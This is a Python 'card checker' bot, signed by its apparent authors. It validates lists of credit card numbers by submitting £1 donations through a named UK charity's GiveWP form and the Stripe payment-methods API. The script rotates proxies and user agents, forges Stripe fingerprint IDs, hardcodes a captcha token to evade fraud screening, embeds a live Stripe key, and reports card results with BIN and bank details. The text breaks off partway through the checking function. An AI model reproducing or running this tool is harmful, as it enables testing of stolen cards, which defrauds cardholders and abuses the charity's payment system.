import requests
import os
import re
import random
import string
import time
import json
import uuid
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3
import threading
from urllib.parse import urlencode

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
EMAIL = "mhitzxg@mechanicspedia.com"
BASE_URL = "https://www.stanleygrange.org.uk"
STRIPE_KEY = "pk_live_SMtnnvlq4TpJelMdklNha8iD"
STRIPE_ACCOUNT = "acct_1IJK3TGT8Lw6xhIV"

def get_rotating_user_agent():
    desktop_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/143.0.0.0'
    ]
    return random.choice(desktop_agents)

def parse_proxy(proxy_str):
    try:
        proxy_str = proxy_str.strip()
        
        if '@' in proxy_str:
            auth_part, server_part = proxy_str.split('@', 1)
            username, password = auth_part.split(':', 1)
            ip, port = server_part.split(':', 1)
        else:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                ip, port, username, password = parts
            elif len(parts) == 2:
                ip, port = parts
                username, password = None, None
            else:
                ip, port = parts[0], parts[1]
                username, password = None, None
        
        if username and password:
            proxy_url = f'http://{username}:{password}@{ip}:{port}'
        else:
            proxy_url = f'http://{ip}:{port}'
        
        return {'http': proxy_url, 'https': proxy_url}
    except:
        return None

def load_proxies():
    """Load proxies from proxy.txt file"""
    if os.path.exists('proxy.txt'):
        with open('proxy.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    return []

def setup_session(proxy_str=None):
    r = requests.Session()
    
    # Setup retry strategy
    retry_strategy = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[500, 502, 503, 504, 429],
        allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    r.mount("https://", adapter)
    r.mount("http://", adapter)
    
    # Set proxies if provided
    if proxy_str:
        proxies = parse_proxy(proxy_str)
        if proxies:
            r.proxies.update(proxies)
    
    return r

def get_bin_info(bin_number):
    if not bin_number or len(bin_number) < 6:
        return {
            'bank': 'Unavailable',
            'country': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': ''
        }
    
    bin_code = bin_number[:6]
    apis_to_try = [
        f"https://lookup.binlist.net/{bin_code}",
        f"https://bins.antipublic.cc/bins/{bin_code}",
    ]

    headers = {
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    for api_url in apis_to_try:
        try:
            response = requests.get(api_url, headers=headers, timeout=10, verify=False)
            if response.status_code == 200:
                data = response.json()
                bin_info = {}
                
                if 'binlist.net' in api_url:
                    bin_info = {
                        'bank': data.get('bank', {}).get('name', 'Unavailable'),
                        'country': data.get('country', {}).get('name', 'Unknown'),
                        'brand': data.get('scheme', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('brand', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country', {}).get('alpha2', ''))
                    }
                elif 'antipublic.cc' in api_url:
                    bin_info = {
                        'bank': data.get('bank', 'Unavailable'),
                        'country': data.get('country', 'Unknown'),
                        'brand': data.get('vendor', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('level', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country_code', ''))
                    }
                
                for key in ['bank', 'country', 'brand', 'type', 'level']:
                    if not bin_info.get(key) or bin_info[key] in ['', 'N/A', 'None', 'null']:
                        bin_info[key] = 'Unknown'
                
                if bin_info['bank'] not in ['Unavailable', 'Unknown'] or bin_info['brand'] != 'Unknown':
                    return bin_info
                    
        except:
            continue
    
    return {
        'bank': 'Unavailable',
        'country': 'Unknown',
        'brand': 'Unknown',
        'type': 'Unknown',
        'level': 'Unknown',
        'emoji': ''
    }

def get_country_emoji(country_code):
    if not country_code or len(country_code) != 2:
        return ''
    try:
        country_code = country_code.upper()
        return ''.join(chr(127397 + ord(char)) for char in country_code)
    except:
        return ''

def extract_error_message(response_json, response_text):
    """Extract actual error message from site response"""
    error_message = None
    
    # Handle simple response types
    if isinstance(response_json, (int, float)):
        if response_json == 0:
            error_message = "Payment failed"
        else:
            error_message = f"Response code: {response_json}"
    elif isinstance(response_json, bool):
        if not response_json:
            error_message = "Payment failed"
        else:
            error_message = "Success"
    elif isinstance(response_json, str):
        error_message = response_json[:200]
    
    # Try to extract from JSON response (dict)
    if not error_message and isinstance(response_json, dict):
        # Check for error message in various locations
        if 'message' in response_json:
            error_message = str(response_json['message']).strip()
        elif 'error' in response_json:
            if isinstance(response_json['error'], dict):
                if 'message' in response_json['error']:
                    error_message = str(response_json['error']['message']).strip()
                else:
                    error_message = str(response_json['error']).strip()
            else:
                error_message = str(response_json['error']).strip()
        elif 'errors' in response_json:
            errors = response_json['errors']
            if isinstance(errors, list) and len(errors) > 0:
                error_message = str(errors[0]).strip()
            elif isinstance(errors, dict):
                # Get first error message
                for key, value in errors.items():
                    if isinstance(value, list) and len(value) > 0:
                        error_message = str(value[0]).strip()
                        break
                    elif isinstance(value, str):
                        error_message = value.strip()
                        break
        # Check for data.message or data.error
        elif 'data' in response_json and isinstance(response_json['data'], dict):
            if 'message' in response_json['data']:
                error_message = str(response_json['data']['message']).strip()
            elif 'error' in response_json['data']:
                error_message = str(response_json['data']['error']).strip()
    
    # If still no message, try to extract from HTML
    if not error_message and response_text:
        # First, look for specific GiveWP error divs (give_error)
        give_error_patterns = [
            r'<div[^>]*class=["\'][^"\']*give_error[^"\']*["\'][^>]*>.*?<p[^>]*>(.*?)</p>',
            r'<div[^>]*id=["\'][^"\']*give_error[^"\']*["\'][^>]*>.*?<p[^>]*>(.*?)</p>',
            r'class=["\']give_error[^"\']*["\'][^>]*>.*?<p[^>]*>(.*?)</p>',
        ]
        
        for pattern in give_error_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE | re.DOTALL)
            if match:
                extracted = match.group(1)
                # Remove HTML tags and clean up
                extracted = re.sub(r'<[^>]+>', '', extracted)
                extracted = extracted.replace('&nbsp;', ' ').replace('&amp;', '&').replace('&quot;', '"').replace('&apos;', "'")
                extracted = re.sub(r'\s+', ' ', extracted).strip()
                # Remove "Error:" prefix if present
                extracted = re.sub(r'^Error\s*:\s*', '', extracted, flags=re.IGNORECASE)
                # Extract only the main error message (before "Please check" or similar)
                # Look for pattern like "There was an issue with your donation transaction: Your card was declined."
                main_error_match = re.search(r'(There was an issue with your donation transaction:\s*[^.]+\.)', extracted, re.IGNORECASE)
                if main_error_match:
                    extracted = main_error_match.group(1).strip()
                else:
                    # Try to get first sentence before "Please check" or "If the issue"
                    split_match = re.search(r'^([^.]+\.[^.]*?)(?:\s+Please|\s+If the issue)', extracted, re.IGNORECASE)
                    if split_match:
                        extracted = split_match.group(1).strip()
                    else:
                        # Just get the first sentence
                        first_sentence = re.search(r'^([^.]+\.[^.]*)', extracted)
                        if first_sentence:
                            extracted = first_sentence.group(1).strip()
                if len(extracted) > 10 and len(extracted) < 300:
                    error_message = extracted
                    break
        
        # Remove all HTML tags first for general extraction
        clean_text = re.sub(r'<[^>]+>', ' ', response_text)
        clean_text = clean_text.replace('&nbsp;', ' ').replace('&amp;', '&').replace('&quot;', '"').replace('&apos;', "'")
        clean_text = re.sub(r'\s+', ' ', clean_text).strip()
        
        # Look for common error patterns in HTML (if not found in give_error divs)
        if not error_message:
            error_patterns = [
                r'<div[^>]*class=["\'][^"\']*error[^"\']*["\'][^>]*>.*?<p[^>]*>(.*?)</p>',
                r'<div[^>]*class=["\'][^"\']*error[^"\']*["\'][^>]*>.*?<strong[^>]*>.*?</strong>\s*(.*?)(?:<br|</p|</div)',
                r'class=["\'](?:error|alert|warning|danger)[^"\']*["\'][^>]*>.*?<p[^>]*>(.*?)</p>',
                r'id=["\'](?:error|alert|warning|danger)[^"\']*["\'][^>]*>.*?<p[^>]*>(.*?)</p>',
                r'<p[^>]*class=["\'][^"\']*error[^"\']*["\'][^>]*>(.*?)</p>',
                r'<span[^>]*class=["\'][^"\']*error[^"\']*["\'][^>]*>(.*?)</span>',
            ]
            
            for pattern in error_patterns:
                match = re.search(pattern, response_text, re.IGNORECASE | re.DOTALL)
                if match:
                    extracted = match.group(1) if match.groups() else match.group(0)
                    extracted = re.sub(r'<[^>]+>', '', extracted).strip()
                    extracted = extracted.replace('&nbsp;', ' ').replace('&amp;', '&').replace('&quot;', '"')
                    extracted = re.sub(r'\s+', ' ', extracted)
                    # Remove "Error:" prefix if present
                    extracted = re.sub(r'^Error\s*:\s*', '', extracted, flags=re.IGNORECASE)
                    if len(extracted) > 10 and len(extracted) < 300:
                        error_message = extracted
                        break
        
        # If no pattern found, look for common error keywords in text
        if not error_message:
            error_keywords = ['declined', 'invalid', 'failed', 'error', 'denied', 'insufficient', 'expired', 'incorrect']
            for keyword in error_keywords:
                if keyword in clean_text.lower():
                    # Extract sentence containing the keyword
                    sentences = re.split(r'[.!?]+', clean_text)
                    for sentence in sentences:
                        if keyword in sentence.lower() and len(sentence.strip()) > 10:
                            error_message = sentence.strip()
                            break
                    if error_message:
                        break
        
        # If still nothing, check if it's just HTML structure (meta tags, etc.)
        if not error_message:
            # Check if response is mostly HTML tags
            tag_count = len(re.findall(r'<[^>]+>', response_text))
            text_length = len(clean_text)
            if tag_count > text_length / 10:  # Mostly HTML structure
                # Look for title tag or any meaningful text
                title_match = re.search(r'<title[^>]*>([^<]+)</title>', response_text, re.IGNORECASE)
                if title_match:
                    error_message = title_match.group(1).strip()
                else:
                    # Extract first meaningful text block (more than 20 chars)
                    text_blocks = re.findall(r'[A-Za-z][^<>]{20,}', clean_text)
                    if text_blocks:
                        error_message = text_blocks[0].strip()[:200]
                    else:
                        error_message = "Payment failed"
            else:
                # Use first meaningful part of clean text
                if len(clean_text) > 20:
                    error_message = clean_text[:200].strip()
                else:
                    error_message = "Payment failed"
    
    # Final cleanup
    if error_message:
        error_message = error_message.strip()
        # Remove any remaining HTML entities
        error_message = error_message.replace('&nbsp;', ' ').replace('&amp;', '&').replace('&quot;', '"').replace('&apos;', "'")
        error_message = re.sub(r'\s+', ' ', error_message)
        # Limit length
        if len(error_message) > 200:
            error_message = error_message[:197] + "..."
        # Remove if it's just HTML structure
        if error_message.startswith('<') or 'meta name' in error_message.lower() or 'viewport' in error_message.lower():
            error_message = "Payment failed"
    
    return error_message if error_message and len(error_message) > 3 else "Payment failed"

def generate_stripe_metadata():
    """Generate Stripe metadata like guid, muid, sid"""
    return {
        'guid': str(uuid.uuid4()).replace('-', '') + str(uuid.uuid4()).replace('-', '')[:16],
        'muid': str(uuid.uuid4()).replace('-', '') + str(uuid.uuid4()).replace('-', '')[:16],
        'sid': str(uuid.uuid4()).replace('-', '') + str(uuid.uuid4()).replace('-', '')[:16]
    }

def check_card_stp(cc_line):
    start_time = time.time()
    max_retries = 2
    
    # Quick validation first
    if not cc_line or '|' not in cc_line:
        elapsed_time = time.time() - start_time
        return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Invalid card format. Expected: number|mm|yy|cvc
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1 £

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
    
    for attempt in range(max_retries):
        try:
            # Parse card details
            if '|' in cc_line:
                parts = cc_line.strip().split('|')
                if len(parts) >= 4:
                    n = parts[0].strip().replace(' ', '').replace('-', '')
                    mm = parts[1].strip()
                    yy = parts[2].strip()
                    cvc = parts[3].strip()
                else:
                    elapsed_time = time.time() - start_time
                    return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Invalid card format. Expected: number|mm|yy|cvc
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1 £

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            else:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Invalid card format. Expected: number|mm|yy|cvc
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1 £

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            # Format month and year
            if len(mm) == 1:
                mm = f'0{mm}'
            # Use 2-digit year for Stripe
            if len(yy) == 4:
                yy = yy[-2:]
            
            # Get BIN info
            bin_info = get_bin_info(n[:6])
            
            # Setup session with random proxy from proxy.txt (separate session for each card - NO COOKIES)
            proxies_list = load_proxies()
            if not proxies_list:
                proxy_str = None
            else:
                proxy_str = random.choice(proxies_list)
            r = setup_session(proxy_str)
            user_agent = get_rotating_user_agent()
            
            # Use original name from request
            first_name = "Sam"
            last_name = "Jones"
            cardholder_name = f"{first_name} {last_name}"
            
            # Generate Stripe metadata
            stripe_meta = generate_stripe_metadata()
            
            # Step 1: Submit donation form (NO COOKIES - separate session)
            headers1 = {
    'accept': '*/*',
                'accept-language': 'en-GB,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'dnt': '1',
                'origin': BASE_URL,
    'priority': 'u=1, i',
                'referer': f'{BASE_URL}/donate',
                'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agent,
                'x-requested-with': 'XMLHttpRequest',
            }
            
            data1 = {
                'give-honeypot': '',
                'give-form-id-prefix': '5543-1',
                'give-form-id': '5543',
                'give-form-title': 'Donate Now',
                'give-current-url': f'{BASE_URL}/donate/',
                'give-form-url': f'{BASE_URL}/donate/',
                'give-form-minimum': '1.00',
                'give-form-maximum': '999999.99',
                'give-form-hash': 'a915b1de9e',
                'give-price-id': '1',
                'give-recurring-logged-in-only': '',
                'give-logged-in-only': '1',
                'give_recurring_donation_details': '{"is_recurring":false}',
                'give-amount': '1.00',
                'give_stripe_payment_method': '',
                'payment-mode': 'stripe_checkout',
                'give_title': 'Mr.',
                'give_first': first_name,
                'give_last': last_name,
                'give_company_option': 'no',
                'give_company_name': '',
                'give_email': EMAIL,
                'give_anonymous_donation': '1',
                'give_comment': '',
                'card_name': '',
                'give_validate_stripe_payment_fields': '0',
                'give_gift_check_is_billing_address': 'yes',
                'give_gift_aid_address_option': 'billing_address',
                'give_gift_aid_card_first_name': '',
                'give_gift_aid_card_last_name': '',
                'give_gift_aid_billing_country': 'GB',
                'give_gift_aid_card_address': '',
                'give_gift_aid_card_address_2': '',
                'give_gift_aid_card_city': '',
                'give_gift_aid_card_state': '',
                'give_gift_aid_card_zip': '',
                'give_action': 'purchase',
                'give-gateway': 'stripe_checkout',
                'action': 'give_process_donation',
                'give_ajax': 'true',
            }
            
            try:
                response1 = r.post(f'{BASE_URL}/wp-admin/admin-ajax.php', headers=headers1, data=data1, timeout=15, verify=False)
                
            except requests.exceptions.Timeout:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Request timeout (Stanley Grange) ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1 £

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            except requests.exceptions.RequestException as e:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Network error: {str(e)[:100]} ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1 £

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            # Step 2: Create payment method with Stripe API
            headers2 = {
                'accept': 'application/json',
                'accept-language': 'en-GB,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'dnt': '1',
                'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
                'user-agent': user_agent,
            }
            
            # Build form data for Stripe payment method
            data2 = {
                'type': 'card',
                'billing_details[name]': f"{first_name}  {last_name}",
                'billing_details[email]': EMAIL,
                'card[number]': n,
                'card[cvc]': cvc,
                'card[exp_month]': mm,
                'card[exp_year]': yy,
                'guid': stripe_meta['guid'],
                'muid': stripe_meta['muid'],
                'sid': stripe_meta['sid'],
                'payment_user_agent': 'stripe.js/c264a67020; stripe-js-v3/c264a67020; split-card-element',
                'referrer': BASE_URL,
                'time_on_page': str(random.randint(100000, 150000)),
                'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'split-card-element',
                'client_attribution_metadata[merchant_integration_version]': '2017',
                'key': STRIPE_KEY,
                '_stripe_account': STRIPE_ACCOUNT,
            }
            
            # Add hCaptcha token (using original format)
            hcaptcha_token = "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzY2OTk5NzY5LCJjZGF0YSI6ImdMRkltRTdqYzM4dHBvdHRnb1krTTJFODVic0F1MzhKZGoxaExKZHVyMHRSb1pEMXd6MVY2NTlINkJ2Wm1JRTZqTElmNXNRY2hmMGJod1JOQm9QQXNBYlNFcEcvY0I5OTVLaC9oUm56RlNnUmdhRGk5ZmxIYlZkWVlpTDVUdVpIQmo4cDBKclcyOGVBWGl1UzJnelRTY253ZzFTa3NZV3BIOTByVENpM0g3MTFIQklpYnRHZFRGMkFGT0xDWEtyVDdhL1N4d2Z6TlFRbGoxVW0iLCJwYXNza2V5IjoiMUQ3dTM4czF0b005TUFLbW1JWjJpZnU0b1BmdTNjRXduZVZUR0pvTzZhNHRsSnZvWE1FbW5vUitBVVNOMGNvOHYya3JPSnFmNFdqUCtScU9nSW50MjZwRUplUDh4VUpyWFhwYThYcXFFdW5WVUdHdVl6WkJVQVJrK0NpRTBpWWt2T0cveW1mWE5lMnVVUGpsNThjM3FZa0ZML3RXNUV1QXdzeU1oV0xPVmdpNStiRS9BS3llekdOM2Rkd2ZJVnVlckdSUXhuVWQ0cWU2emlWYlRJL0ZIMkpLbjBJUXJJaFdXMERlYjBvc0oyenZIbU1ML0FXZDhLVkpHWm03SWxiMUJZeEViNEdZTVV4T3Z5MVNsV2ZCejR5UWw4NmF1ZEtqUUVMaVAzcVBvRUF6dHhoNDdnc3NsbFY4MlVxV3NGQVVaaXFKdk5tUmZWL090LytCeDhlR1doVmEzUkl1TVhDQk9RYktzdnNmd1gwRSswWFpwZmhSbmN0TlhqQndZRjJMQk1TaS9zUU9zZ2JFTVUwU3g3eWl0dDVuemtwZzNGaFlWTDRZNk8rM0xpQUFmang2SFg3NnllYWhraGJDUzdQVGxVd0NRazRHVWU1ZGlKRWw0WUVNaGxmRG1yRXgyMU90YXVWWGZGTkJwNWdtdy95RHhHamNqQWFQUCtPa1A0WmJuNWxMK3E3VVAvdHczL1FwcjVjWEhuNWRQekNpUFpDRTRsUG9qU01qTUFlT004Z3lKdm1QN2ttRmprRzVjZFhrbUJpeTNkNlJLOWZvdk16eUwralF1WVpONXNMRXVJV3pBZm9LRklEQTVIZEw1NmtRc3Fwb3JySXBtVDY0U0FJemxYL3FIQjNqRG1SdGJ0ejVJSDJ2ZkFYSHVnZnEyelJDOUtDNmVQLzhveWwvRElRZmtBamd0SFFPbzJ4T2tyNUV2NkxLYWpwZDUveUwxbStZcGF4K2dlVVhLQjA3L1FyVjQ5UXNwMjh1SGgySHNJRThNUnhHUm1jK2liTjZpc2o3ckk3S2xoMWFoZTlwV2prZmsxYkxMdWpudHhXMStYNWdZUTVtdTJUbWtlOGw1ZHJMc09IM2xqL0xBNmZtWTlMaGVGMGxCdFdlcEVoNTR4OHJnZmxMMDRzZTJSaUdLRmtBbENTWUs4bDB6TmVIK2orS04xb0o0dUphbmVlT1ZhcVdkbXVydEdmazlHSVB1ZGxCYUt4VUVhb0crWUV6QXBmeEJoZW9mN3VLaUM4MGowMm9xaUFYdFhubWNEWFJpR2htL2tWcWc0YURNWTA0a0NvR1JWTmR6dE41bVhKV21GQzZoN05tNEpqM1Y2djJEYUZBRzEvSy9SMzU5QXFTMWlKUTUvVkpzTG5obmNCeFYyZENPeWpMODlsTVVmYmM1WlFBQnpuWFJ4UFduUGN2NUtrdGNDWW9XV3cwQVE4L0RQbFQ2Q290T1dITmZGbHY1U3haMmczUEE1ZVpWRzZIeWwzYUVSZEM0ME11ckpHM0lhYU4wMk1LSTVIaGhXemxXMG8wbVpqRlRGL09yRWZacUpqV0FsQXZGWTVYMzhGR29XNlJJMFo3ZkxicHlSZE43TnlrQU1rNTBHQy9DWndkV1Y4Wnh0UGFUWFBtWkhmTllxckZkOC9ibEdKYmdsSHVGb09Icjl5UEJZS3F5azlYcWpZdml3UWNQNFBnelAxQlozQVhJR0pnNDZOa3BaaUdlWG1INVNLVFptYnB2RU5qc1VhUWErRnJoL0FGQm96QkxCN2I0RkxLWkpqVlU5Ly9HNGtFQjhHQkt0UlI1NW40VkN5aGN4OGFUZTlqN3hLaTZMMzZYbTFrbG93dkIyWTRpWXgyVHE5dzJQSDVUTG5vUkllNEtvSmUzdFlneEJVOC9VQ0ZXRmx1dUhaNmpuZU11RnBrZTRnWWR6VHVjZG5KSGhnWTIxa2tNeEtmVDVSV0I1dE5XajA4MjN1TDZFWEhuTXNtT01QbDBxUDdzR1FESUF2STk4WkpNSE1JbWRWUDQ0VFpUMk45WmEwMTNMMmIvV1Z6SXRsV2FmWGF5bzBKV2hOOXdwK3JZaU1SZ0ttbDh3WVpMY0FZb201QVFvNjJFejAzeGlWMHpHRktGZHFxTU1LWHFNb0cxZkU2Q1ZSdkp3a3o4allQN29oOVVFWUJCMlo1d1U2d2dPRW1VMCtzLzYyd2x6b0FzZVdobnJDVzF4WFZEVnlIMFBpUXg5aTFNblNWbkRhT20xek9DVVZlYStxTGxhMytxdHk2V0xwaUFxQ25jdVh6NGFSRlhPeE5ROTFMMzBrbVpaaUNyVGV1R3gyOUZxclpSV004bVZFeHNWbFVTR05jTUhjNjh3cGJQYlpTTnNDeGR0RVRkV0FHMnlTTTcyV0JHeHFYVW02bzQybUtqU2VGUGVYSkI2OGcybEczd01Yd1FUbE9Wdkk2a2JTcDFIcFIyK21kU2ZId1IvQnB1dWtZVUxyTlRXdXI5TG13eWF0RnkyK0tFSDROMi8zZTBVTFNUWFpEVHBuQUl3K1FVYVBITFdlRHVzVVNOeHp0dDZHQzRaSmJ6dkFubFFWczhidjhheXAweVpnPSIsImtyIjoiNGJhNGM0MDAiLCJzaGFyZF9pZCI6MjU5MTg5MzU5fQ.0Llsq1HFNRsBsEgpPacmVmGZbpqX1biaeltq--1cm80"
            data2['radar_options[hcaptcha_token]'] = hcaptcha_token
            
            form_data2 = urlencode(data2)
            
            try:
                response2 = r.post('https://api.stripe.com/v1/payment_methods', headers=headers2, data=form_data2, timeout=15, verify=False)
            except requests.exceptions.Timeout:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Request timeout (Stripe API) ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1 £

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            except requests.exceptions.RequestException as e:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Network error: {str(e)[:100]} ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1 £

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
            # Check Stripe API response for errors and get payment method ID
            try:
                response2_json = response2.json()
                
                # Check for errors in Stripe response first
                if 'error' in response2_json:
                    error_obj = response2_json['error']
                    if isinstance(error_obj, dict):
                        error_type = error_obj.get('type', '')
                        error_code = error_obj.get('code', '')
                        error_message = error_obj.get('message', '')
                        decline_code = error_obj.get('decline_code', '')
                        
                        # Build comprehensive error message
                        if error_message:
                            error_msg = error_message
                        elif error_code:
                            error_msg = f"Error: {error_code}"
                        else:
                            error_msg = "Card declined"
                        
                        if decline_code:
                            error_msg += f" ({decline_code})"
                        
                        # Use Stripe error
                        final_msg = error_msg
                        
                        return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_msg} ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1 £

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                    else:
                        error_msg = str(error_obj)
                        final_msg = error_msg
                        return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_msg} ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1 £

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
